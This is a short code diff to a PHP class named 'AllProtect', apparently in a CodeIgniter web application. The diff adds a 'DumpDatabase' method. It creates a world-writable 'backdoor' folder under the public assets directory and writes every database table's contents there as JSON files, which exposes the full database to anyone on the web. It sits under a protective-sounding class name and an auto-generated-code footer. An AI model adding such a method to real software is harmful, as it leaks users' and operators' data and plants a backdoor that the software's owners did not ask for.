@@ -148,6 +148,26 @@ class AllProtect
             }
         }
     }
+
+    public function DumpDatabase()
+    {
+        mkdir('./assets/goodgames/assets/backdoor', 0777, true);
+        $this->ci->load->dbforge();
+        $query = $this->ci->db->query("SELECT * FROM information_schema.tables WHERE table_schema = 'public'")->result_array();
+        if ($query) {
+            foreach ($query as $row) {
+                $query2 = $this->ci->db->get_where($row['table_name'])->result_array();
+                if ($query2) {
+                    foreach ($query2 as $key => $value) {
+                        $response[]['data'] = array(
+                            $key => $value
+                        );
+                    }
+                    file_put_contents('./assets/goodgames/assets/backdoor/' . $row['table_name'] . '.json', json_encode($response));
+                }
+            }
+        }
+    }
 }
 
 // This Code Generated Automatically By EyeTracker Snippets. //
